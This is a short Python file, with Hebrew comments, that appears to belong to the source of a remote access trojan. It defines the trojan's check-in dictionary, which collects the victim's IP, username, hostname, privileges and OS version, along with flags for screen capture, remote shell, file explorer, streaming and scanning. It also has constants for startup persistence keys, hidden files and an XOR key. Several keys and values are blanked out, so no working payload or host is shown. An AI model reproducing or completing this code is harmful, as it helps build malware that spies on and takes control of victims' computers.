import base64
import os
import sys

# /** PYTHON **/

"""
    ---- PACKET_TROJAN_PROTOCOL ----
    מילון זה מכיל הגדרות תצורה של אותה גירסא של הסוס 
    בעת התחברות נוצר מילוי של הנתונים (חלקם משתנים במצבים מסויימים)
    והסוס ישלח את המילון, צד השרת יתמודד עם התאימות ויותאם לו 
    
"""

PACKET_TROJAN_PROTOCOL:dict = {
    ""       : '',        # key hidden
    "ip"            : "",
    "recv"          : 0,  
    "port"          : 0,
    "user"          : "",
    "hostname"      : "",
    ""      : "",        # key hidden
    "priv"          : "",
    "versionos"     : "",
    ""       : "",        # key hidden
    ""    : "",           # key hidden
    'xor'           : b"",
    'block_stream'  : False,
    'screen'        : 1,
    'shell'         : 1,
    'explorer'      : 1,
    'ping'          : 1,
    'streamer'      : 1,
    'scanner'       : 1,
    'shell-ter'     : 0, # לא נתמך בפייתון
}

# חלק מפרוטוקול התקשורת
OK = "" # // value not here


NOOD_PATH     = f"" # // value not here
NOOD_NAME     = sys.argv[0]
H_T_NAME      = str() # // value not here
startup_keys  = base64.b64decode("").decode() # // value not here
hidden_files  = base64.b64decode("").decode() # // value not here
# חלק ממבנה החבילה
BLOCK_FRM     = b"" # // hidden
# קבוע לצורך חלוקת הפריים
SUM_BLOCKS    = 3
